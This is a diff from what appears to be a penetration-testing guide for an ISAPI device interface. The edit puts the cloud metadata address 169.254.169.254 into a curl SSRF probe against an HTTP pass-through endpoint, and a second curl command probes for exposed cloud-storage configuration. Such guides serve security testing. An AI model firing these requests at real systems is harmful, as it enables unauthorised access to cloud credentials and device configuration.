@@ -181,7 +181,7 @@ Prioritize these endpoints which may enable SSRF, data access, or privilege esca
 # HTTP pass-through (potential SSRF)
 curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/DAM/HTTPPassThrough" \
   -H "Content-Type: application/json" \
-  -d '{"url":"http://[REDACTED_IP]/"}' 
+  -d '{"url":"http://169.254.169.254/"}' 
 
 # Cloud storage configuration exposure
 curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig"
